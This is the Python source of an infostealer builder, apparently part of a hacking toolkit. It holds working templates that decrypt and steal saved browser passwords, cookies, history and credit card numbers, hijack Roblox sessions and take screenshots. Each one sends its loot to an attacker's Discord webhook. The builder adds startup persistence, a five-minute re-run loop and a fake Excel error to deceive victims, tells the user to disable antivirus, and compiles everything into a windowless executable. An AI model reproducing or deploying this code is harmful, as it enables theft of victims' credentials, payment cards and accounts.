        def get_login_data(self, path: str, profile: str):
            login_db = f'{path}\\{profile}\\Login Data'
            if not os.path.exists(login_db):
                return

            shutil.copy(login_db, 'login_db')
            conn = sqlite3.connect('login_db')
            cursor = conn.cursor()
            cursor.execute(
                'SELECT action_url, username_value, password_value FROM logins')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2]:
                    continue

                url = f"- [+] |URL|: {row[0]}"
                username = f"   |USERNAME|: {row[1]}"
                password = f"   |PASSWORD|: {self.decrypt_password(row[2], self.master_key)}"
                __LOGINS__.append(Types.Login(url, username, password))

            conn.close()
            os.remove('login_db')

        def get_cookies(self, path: str, profile: str):
            cookie_db = f'{path}\\{profile}\\Network\\Cookies'
            if not os.path.exists(cookie_db):
                return

            try:
                shutil.copy(cookie_db, 'cookie_db')
                conn = sqlite3.connect('cookie_db')
                cursor = conn.cursor()
                cursor.execute(
                    'SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
                for row in cursor.fetchall():
                    if not row[0] or not row[1] or not row[2] or not row[3]:
                        continue
                    url = f"- [+] |URL|: {row[0]}"
                    name = f"  |NAME|: {row[1]}"
                    path = f"  |PATH|: {row[2]}"
                    cookie = f"  |COOKIE|: {self.decrypt_password(row[3], self.master_key)}"
                    expire = f"  |EXPIRE|: {row[4]}"

                    __COOKIES__.append(Types.Cookie(url, name, path, cookie, expire))
                conn.close()
            except:
                ()

            os.remove('cookie_db')

        def get_web_history(self, path: str, profile: str):
            web_history_db = f'{path}\\{profile}\\History'
            if not os.path.exists(web_history_db):
                return

            shutil.copy(web_history_db, 'web_history_db')
            conn = sqlite3.connect('web_history_db')
            cursor = conn.cursor()
            cursor.execute('SELECT url, title, last_visit_time FROM urls')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2]:
                    continue
                url = f"- [+] |URL|: {row[0]}"
                title = f"  |TITLE|: {row[1]}"
                time = f"  |TIME|: {row[2]}"
                __WEB_HISTORY__.append(Types.WebHistory(url, title, time))

            conn.close()
            os.remove('web_history_db')

        def get_downloads(self, path: str, profile: str):
            downloads_db = f'{path}\\{profile}\\History'
            if not os.path.exists(downloads_db):
                return

            shutil.copy(downloads_db, 'downloads_db')
            conn = sqlite3.connect('downloads_db')
            cursor = conn.cursor()
            cursor.execute('SELECT tab_url, target_path FROM downloads')
            for row in cursor.fetchall():
                if not row[0] or not row[1]:
                    continue
                
                path = f"- [+] |PATH|: {row[1]}"
                url = f"  |URL|: {row[0]}"
                __DOWNLOADS__.append(Types.Download(path, url))

            conn.close()
            os.remove('downloads_db')

        def get_credit_cards(self, path: str, profile: str):
            cards_db = f'{path}\\{profile}\\Web Data'
            if not os.path.exists(cards_db):
                return

            shutil.copy(cards_db, 'cards_db')
            conn = sqlite3.connect('cards_db')
            cursor = conn.cursor()
            cursor.execute(
                'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue
                name = f"- [+] |NAME|: {row[0]}"
                expiration_month = f"  |EXPIRATION MOUNTH|: {row[1]}"
                expiration_year = f"  |EXPIRATION YEAR|: {row[2]}"
                card_number = f"  |CARD NUMBER|: {self.decrypt_password(row[3], self.master_key)}"
                date_modified = f"  |DATE MODIFIED|: {row[4]}"
                __CARDS__.append(Types.CreditCard(name, expiration_month, expiration_year, card_number, date_modified))

            conn.close()
            os.remove('cards_db')


    class Types:
        class Login:
            def __init__(self, url, username, password):
                self.url = url
                self.username = username
                self.password = password

            def __str__(self):
                return f'{self.url}\t{self.username}\t{self.password}'

            def __repr__(self):
                return self.__str__()

        class Cookie:
            def __init__(self, host, name, path, value, expires):
                self.host = host
                self.name = name
                self.path = path
                self.value = value
                self.expires = expires

            def __str__(self):
                return f'{self.host}\t{"FALSE" if self.expires == 0 else "TRUE"}\t{self.path}\t{"FALSE" if self.host.startswith(".") else "TRUE"}\t{self.expires}\t{self.name}\t{self.value}'

            def __repr__(self):
                return self.__str__()

        class WebHistory:
            def __init__(self, url, title, timestamp):
                self.url = url
                self.title = title
                self.timestamp = timestamp

            def __str__(self):
                return f'{self.url}\t{self.title}\t{self.timestamp}'

            def __repr__(self):
                return self.__str__()

        class Download:
            def __init__(self, tab_url, target_path):
                self.tab_url = tab_url
                self.target_path = target_path

            def __str__(self):
                return f'{self.tab_url}\t{self.target_path}'

            def __repr__(self):
                return self.__str__()

        class CreditCard:
            def __init__(self, name, month, year, number, date_modified):
                self.name = name
                self.month = month
                self.year = year
                self.number = number
                self.date_modified = date_modified

            def __str__(self):
                return f'{self.name}\t{self.month}\t{self.year}\t{self.number}\t{self.date_modified}'

            def __repr__(self):
                return self.__str__()
            
    Browser(webhook_url)
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

RobloxGrab = r'''
def Roblox_Grab():
    def get_cookie_and_navigator(browser_function):
        try:
            cookies = browser_function()
            cookies = str(cookies)
            cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            navigator = browser_function.__name__
            return cookie, navigator
        except Exception as e:
            return None, None

    def Edge():
        return browser_cookie3.edge(domain_name="roblox.com")

    def Chrome():
        return browser_cookie3.chrome(domain_name="roblox.com")

    def Firefox():
        return browser_cookie3.firefox(domain_name="roblox.com")

    def Opera():
        return browser_cookie3.opera(domain_name="roblox.com")

    def Safari():
        return browser_cookie3.safari(domain_name="roblox.com")

    def Brave():
        return browser_cookie3.brave(domain_name="roblox.com")

    browsers = [Edge, Chrome, Firefox, Opera, Safari, Brave]

    for browser in browsers:
        cookie, navigator = get_cookie_and_navigator(browser)
        if cookie:
            try:
                info = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": cookie})
                information = json.loads(info.text)
            except:
                ()

            try:
                username_roblox = information['UserName']
            except KeyError:
                username_roblox = "None"

            try:
                user_id_roblox = information["UserID"]
            except KeyError:
                user_id_roblox = "None"

            try:
                robux_roblox = information["RobuxBalance"]
            except KeyError:
                robux_roblox = "None"

            try:
                premium_roblox = information["IsPremium"]
            except KeyError:
                premium_roblox = "None"

            try:
                avatar_roblox = information["ThumbnailUrl"]
            except KeyError:
                avatar_roblox = avatar_embed

            try:
                builders_club_roblox = information["IsAnyBuildersClubMember"]
            except:
                builders_club_roblox = "None"
    
            size_cookie = len(cookie)
            middle_cookie = size_cookie // 2
            cookie_part1 = cookie[:middle_cookie]
            cookie_part2 = cookie[middle_cookie:]

            client = SyncWebhook.from_url(webhook_url)

            embed = discord.Embed(
                title=f':video_game: | Roblox Info `{username_pc} "{ip_address_public}"`:',
                color=color_embed
            )
            embed.set_footer(text=footer_text, icon_url=avatar_embed)
            embed.set_thumbnail(url=avatar_roblox)
            embed.add_field(name=":compass: | Navigator:", value=f"```{navigator}```", inline=True)
            embed.add_field(name=":bust_in_silhouette: | Username:", value=f"```{username_roblox}```", inline=True)
            embed.add_field(name=":robot: | Id:", value=f"```{user_id_roblox}```", inline=True)
            embed.add_field(name=":moneybag: | Robux:", value=f"```{robux_roblox}```", inline=True)
            embed.add_field(name=":tickets: | Premium:", value=f"```{premium_roblox}```", inline=True)
            embed.add_field(name=":construction_site: | Builders Club:", value=f"```{builders_club_roblox}```", inline=True)
            embed.add_field(name=":cookie: | Cookie Part 1:", value=f"```{cookie_part1}```", inline=False)
            embed.add_field(name=":cookie: | Cookie Part 2:", value=f"```{cookie_part2}```", inline=False)

            client.send(embed=embed, username=username_embed,
                              avatar_url=avatar_embed)
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

ScreenshotGrab = r'''
def Screenshot_Grab():
    try:
        embed = Embed(title=f":desktop: | Screenshot `{username_pc} \"{ip_address_public}\"`:", color=color_embed)

        image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        image.save("screenshot.png")

        embed.set_image(url="attachment://screenshot.png")

        embed.set_footer(text=footer_text, icon_url=avatar_embed )
        webhook = SyncWebhook.from_url(webhook_url)
        webhook.send(
                embed=embed,
                file=File('.\\screenshot.png', filename='screenshot.png'),
                username=username_embed,
                avatar_url=avatar_embed
            )
        try:
            if os.path.exists("screenshot.png"):
                    os.remove("screenshot.png")
        except:
             ()
    except:
       ()
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Startup = r'''
def Startup():
   try:
    try:
        chemin_script = os.path.abspath(__file__)
        nouveau_nom = "ㅤ.py"

        if sys.platform.startswith('win'):  
            dossier_demarrage = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        elif sys.platform.startswith('darwin'): 
            dossier_demarrage = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
        elif sys.platform.startswith('linux'):
            dossier_demarrage = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
        else:
            pass
        chemin_nouveau_fichier = os.path.join(dossier_demarrage, nouveau_nom)

        shutil.copy(chemin_script, chemin_nouveau_fichier)
        os.chmod(chemin_nouveau_fichier, 0o777) 
    except:
        chemin_script = sys.executable
        nouveau_nom = "ㅤ.exe"
        if sys.platform.startswith('win'):  
            dossier_demarrage = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        elif sys.platform.startswith('darwin'): 
            dossier_demarrage = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
        elif sys.platform.startswith('linux'):
            dossier_demarrage = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
            
        chemin_nouveau_fichier = os.path.join(dossier_demarrage, nouveau_nom)
        shutil.copy(chemin_script, chemin_nouveau_fichier)
        os.chmod(chemin_nouveau_fichier, 0o777)
   except:
       pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Start = r'''
payload = {
    'content': f'****╔═════════════════Victim Affected═════════════════╗****',
    'username': username_embed,
    'avatar_url': avatar_embed,
}
requests.post(webhook_url, json=payload)

try:
    Startup()
except:
    pass
try:
    System_Grab()
except:
    pass
try:
    Screenshot_Grab()
except:
    pass
try:
    Discord_Grab()
except:
    pass
try:
    Browser_Grab()
except:
    pass
try:
    Roblox_Grab()
except:
    pass

payload = {
    'content': f'****╚══════════════════{ip_address_public}══════════════════╝****',
    'username': username_embed,
    'avatar_url': avatar_embed,
}
requests.post(webhook_url, json=payload)

try:
    Fake_Error()
except:
    pass
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

Restart = r'''
while True:
    time.sleep(300)

    payload = {
    'content': f'****╔════════════════════Injection═══════════════════╗****',
    'username': username_embed,
    'avatar_url': avatar_embed,
    }
    requests.post(webhook_url, json=payload)
    try:
        System_Grab()
    except:
        pass
    try:
        Roblox_Grab()
    except:
        pass
    try:
        Screenshot_Grab()
    except:
        pass
    try:
        Discord_Grab()
    except:
        pass
    try:
        Browser_Grab()
    except:
        pass

    payload = {
    'content': f'****╚══════════════════{ip_address_public}══════════════════╝****',
    'username': username_embed,
    'avatar_url': avatar_embed,
    }
    requests.post(webhook_url, json=payload)
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

FakeError = r'''
def Fake_Error():
    file = "Error.vbs"
    code = """
    x=msgbox("The file is corrupt and cannot be opened.", 16, "Microsoft Excel")
    """
    try:
        with open(file, "w") as filevbs:
            filevbs.write(code)
        subprocess.run(["cscript", file], shell=True)
        os.remove(file)
    except:
        ()
'''

# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

from Config.Util import *
from Config.Config import *
import random
import os
import subprocess
import requests
import shutil
import tkinter as tk
from tkinter import filedialog

Title("Builder Grab")

print(f"""{color.WHITE}                      
                      ╔═════════════╦══════════════╦══════════════╦═════════════╦═════════════════╗
                      {color.WHITE}║ {color.RED}System Grab{color.WHITE} ║ {color.RED}Discord Grab{color.WHITE} ║ {color.RED}Browser Grab{color.WHITE} ║ {color.RED}Roblox Grab{color.WHITE} ║ {color.RED}Screenshot Grab{color.WHITE} ║
                      ╚═════════════╩══════════════╩══════════════╩═════════════╩═════════════════╝

{color.RED}{INFO} Disable your antivirus !
{color.RED}{INFO} Custom your grabber:""")


import tkinter as tk
from tkinter import filedialog
from tkinter import ttk

def update_variables():
    global add_system, add_discord, add_browser, add_roblox, add_screenshot, add_startup, add_fake_error, add_restart, webhook, name_file, exe_or_not
    add_system = add_system_var.get()
    add_discord = add_discord_var.get()
    add_browser = add_browser_var.get()
    add_roblox = add_roblox_var.get()
    add_screenshot = add_screenshot_var.get()
    add_startup = add_startup_var.get()
    add_fake_error = add_fake_error_var.get()
    add_restart = add_restart_var.get()
    webhook = webhook_entry.get()
    name_file = name_file_entry.get()


    if exe_option_var.get() == "Python File":
        exe_or_not = "Python File"
    else:
        exe_or_not = "Exe File"
    
    if not name_file.strip():
        random_number = random.randint(1, 1000)
        name_file = f'BuilderGrab_{random_number}'

    print("Webhook            :", webhook)
    print("System Grab        :", add_system)
    print("Discord Grab       :", add_discord)
    print("Browser Grab       :", add_browser)
    print("Roblox Grab        :", add_roblox)
    print("Screenshot Grab    :", add_screenshot)
    print("Launch at Startup  :", add_startup)
    print("Fake Error         :", add_fake_error)
    print("Restart Every 5min :", add_restart)
    print("File Type          :", exe_or_not)
    print("File Name          :", name_file)
    print("Icon Path          :", icon_path)

    root.quit()
    root.destroy()

def choose_icon():
    global icon_path
    try:
        root = tk.Tk()
        root.iconbitmap('Img/FNIKICHA_icon.ico')
        root.withdraw()
        root.attributes('-topmost', True)
        icon_path = filedialog.askopenfilename(parent=root, title=f"{name_tool} {version_tool} | Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
    except:
        pass

def exe_option_changed(*args):
    if exe_option_var.get() == "Python File":
        icon_button.config(state="disabled")
    else:
        icon_button.config(state="normal")


root = tk.Tk()
root.iconbitmap('Img/FNIKICHA_icon.ico')
root.title(f'{name_tool} {version_tool} | Builder Stealer')
root.geometry("800x400")
root.resizable(False, False)

red_color = '#a80505'
custom_color = "#ffffff"
custom_font = ("Impact", 30)
custom_background = "#141414"

root.configure(background=custom_background) 

label_texte = tk.Label(root, text="Builder Options", font=custom_font, background=custom_background, foreground=custom_color)
label_texte.grid(row=0, column=0, columnspan=2, sticky="n", pady=(10, 0), padx=(140, 20))  # Utilisation de padx pour ajuster la position horizontale


def on_entry_focus_in(event):
    if webhook_entry.get() == "Webhook URL":
        webhook_entry.delete(0, "end")
        webhook_entry.config(fg="white")

def on_entry_focus_out(event):
    if webhook_entry.get() == "":
        webhook_entry.insert(0, "Webhook URL")
        webhook_entry.config(fg="white")

webhook_entry = tk.Entry(root, background="#303030", foreground="white", relief="flat", highlightbackground="#383E42", highlightthickness=1.5, font=("Calibri", 12))
webhook_entry.grid(row=1, column=0, columnspan=2, sticky="ew", padx=(130, 0), pady=10)
webhook_entry.insert(0, "Webhook URL")
webhook_entry.bind("<FocusIn>", on_entry_focus_in)
webhook_entry.bind("<FocusOut>", on_entry_focus_out)
root.grid_columnconfigure(0, weight=0) 
webhook_entry.config(width=60)


add_system = "None"
add_discord = "None"
add_browser = "None"
add_roblox = "None"
add_screenshot = "None"
add_startup = "None"
add_fake_error = "None"
add_restart = "None"
webhook = "None"
name_file = "None"
icon_path = ""

add_system_var = tk.StringVar(value="None")
add_discord_var = tk.StringVar(value="None")
add_browser_var = tk.StringVar(value="None")
add_roblox_var = tk.StringVar(value="None")
add_screenshot_var = tk.StringVar(value="None")
add_startup_var = tk.StringVar(value="None")
add_fake_error_var = tk.StringVar(value="None")
add_restart_var = tk.StringVar(value="None")
exe_option_var = tk.StringVar(value="Python File")

style = ttk.Style()
style.configure('Custom.TCheckbutton', font=('Calibri', 18, "bold"), background=root.cget('bg'), foreground=custom_color, relief='raised',indicatorsize=20)

add_system_cb = ttk.Checkbutton(root, text="System Grab", variable=add_system_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
add_discord_cb = ttk.Checkbutton(root, text="Discord Grab", variable=add_discord_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
add_browser_cb = ttk.Checkbutton(root, text="Browser Grab", variable=add_browser_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
add_roblox_cb = ttk.Checkbutton(root, text="Roblox Grab", variable=add_roblox_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
add_screenshot_cb = ttk.Checkbutton(root, text="Screenshot Grab", variable=add_screenshot_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
add_fake_error_cb = ttk.Checkbutton(root, text="Fake Error", variable=add_fake_error_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
add_startup_cb = ttk.Checkbutton(root, text="Launch at Startup", variable=add_startup_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')
add_restart_cb = ttk.Checkbutton(root, text="Restart Every 5min", variable=add_restart_var, onvalue="y", offvalue="n", style='Custom.TCheckbutton')

add_system_cb.grid(row=4, column=0, padx=(180, 20), sticky="w")
add_discord_cb.grid(row=5, column=0, padx=(180, 20), sticky="w")
add_browser_cb.grid(row=6, column=0, padx=(180, 20), sticky="w")
add_roblox_cb.grid(row=7, column=0, padx=(180, 20), sticky="w")
add_screenshot_cb.grid(row=4, column=1, padx=(5, 10), sticky="w")
add_fake_error_cb.grid(row=5, column=1, padx=(5, 10), sticky="w")
add_startup_cb.grid(row=6, column=1, padx=(5, 10), sticky="w")
add_restart_cb.grid(row=7, column=1, padx=(5, 10), sticky="w")


style = ttk.Style()
style.configure('Red.TButton', borderwidth=0, background=custom_background, font=('Calibri', 12, "bold"), foreground=custom_background)

def on_entry_focus_in(event):
    if name_file_entry.get() == "File Name":
        name_file_entry.delete(0, "end")
        name_file_entry.config(fg="white")

def on_entry_focus_out(event):
    if name_file_entry.get() == "":
        name_file_entry.insert(0, "File Name")
        name_file_entry.config(fg="white")

name_file_entry = tk.Entry(root, background="#303030", foreground="white", relief="flat", highlightbackground="#383E42", highlightthickness=1.5, font=("Calibri", 12), width=20)
name_file_entry.grid(row=9, column=0, padx=(60, 0), pady=(20, 10))

name_file_entry.insert(0, "File Name")
name_file_entry.bind("<FocusIn>", on_entry_focus_in)
name_file_entry.bind("<FocusOut>", on_entry_focus_out)
exe_option_var = tk.StringVar(value="File Type")

down_arrow_image = tk.PhotoImage(file="Img/down_arrow.png").subsample(40)
exe_option_menu = ttk.OptionMenu(root, exe_option_var, *["File Type ", "Python File", "Exe File"], style='Red.TButton')
exe_option_menu.grid(row=9, column=1, sticky="w", padx=(0, 200), pady=(20, 10))

exe_option_menu.config(compound="right", image=down_arrow_image)
exe_option_var.trace_add("write", exe_option_changed)

select_icon_image = tk.PhotoImage(file="Img/links_redirection.jpg").subsample(40)
icon_button = ttk.Button(root, text="Select Icon ", command=choose_icon, style='Red.TButton')
icon_button.grid(row=9, column=1, sticky="e", padx=(0, 50), pady=(20, 10))
icon_button.config(compound="right", image=select_icon_image)

if exe_option_var.get() == "Python File":
    icon_button.config(state="disabled")

root.grid_columnconfigure(0, minsize=0) 

style = ttk.Style()
style.configure('CustomButton.TButton', borderwidth=0, background=custom_background, font=('Calibri', 15, "bold"), foreground=custom_background)

# Création du bouton avec le style défini
build_button = ttk.Button(root, text="Build", command=update_variables, style='CustomButton.TButton', width=15)
build_button.grid(row=10, column=0, columnspan=2, pady=(30, 0), padx=(100,0))



root.mainloop()


try:
    if webhook.lower().startswith("https://discord.com/api/webhooks"):
        pass
    else:
        ErrorWebhook()
except:
   ErrorWebhook()


file_text_relative = f'./1-File-Output/BuilderStealer/{name_file}.txt'
file_text = os.path.abspath(file_text_relative)

file_python_relative = f'./1-File-Output/BuilderStealer/{name_file}.py'
file_python = os.path.abspath(file_python_relative)

path_destination_relative = "./1-File-Output/BuilderStealer"
path_destination = os.path.abspath(path_destination_relative)


print(f"{color.RED}{INFO} Installing missing modules:{color.RESET}")

file_bat = os.path.abspath("./Settings/Setup-Builder.bat")
subprocess.call(file_bat, shell=True)
time.sleep(3)


with open(file_text, 'w', encoding='utf-8') as file:
 try:
    file.write(f"webhook_url = \"{webhook}\"")
    file.write(Obligatory)

    if add_system in ['y']:
        file.write(SystemGrab)

    if add_discord in ['y']:
        file.write(DiscordGrab)

    if add_browser in ['y']:
        file.write(BrowserGrab)

    if add_roblox in ['y']:
        file.write(RobloxGrab)

    if add_screenshot in ['y']:
        file.write(ScreenshotGrab)

    if add_startup in ['y']:
        file.write(Startup)

    if add_fake_error in ['y']:
        file.write(FakeError)

    file.write(Start)

    if add_restart in ['y']:
        file.write(Restart)
 except Exception as e:
    print(f"{color.RED}\n{ERROR} Text file not created: {color.WHITE}{e}")


try:
    with open(file_text, 'r', encoding='utf-8') as file_txt:
        contenu = file_txt.read()

    with open(file_python, 'w', encoding='utf-8') as file_py:
        file_py.write(contenu)

    with open(file_text, 'w', encoding='utf-8') as file:
        file.write(f"{path_destination}")

    print(f"{color.RED}\n{INFO} Python file created: \"{color.WHITE}{file_python}{color.RED}\"")
except Exception as e:
   print(f"{color.RED}{ERROR} Python file not created: {color.WHITE}{e}")


def convert_to_exe(script_name, destination_path, icon_path=None):
    print(f"{color.RED}{INFO} Converting to .exe:{color.RESET}")
    try:
        script_path = os.path.abspath(script_name)

        if not os.path.exists(destination_path):
            os.makedirs(destination_path)

        pyinstaller_command = ['pyinstaller', '--onefile', '--distpath', destination_path, '--noconsole', script_path]

        if icon_path:
            pyinstaller_command.extend(['--icon', icon_path])

        subprocess.run(pyinstaller_command)

        print(f"{color.RED}{INFO} Conversion successful. The executable is located in the folder \"{color.WHITE}{destination_path}{color.RED}\"")
    except Exception as e:
        print(f"{color.RED}{ERROR} Error during conversion: {color.WHITE}{e}")

if exe_or_not in ['Exe File']:
    convert_to_exe(file_python, path_destination, icon_path)


print(f"{color.RED}{INFO} Removing temporary files from conversion..{color.RESET}")
try:
    directory = os.getcwd()
    if exe_or_not in ['Exe File']:
        shutil.rmtree(f"{directory}/build")
        os.remove(f"{name_file}.spec")
        os.remove(file_python)
    os.remove(file_text)
    print(f"{color.RED}{INFO} Temporary file removed.{color.RESET}")
except Exception as e:
    print(f"{color.RED}{ERROR} Temporary file not removed: {color.WHITE}{e}")

try:
    print(f"{color.RED}{INFO} Open \"{color.WHITE}{path_destination}{color.RED}\"")
    path = directory + "/1-File-Create"
    path = os.path.realpath(path)
    os.startfile(path)
except:
   ()
Continue()
Reset()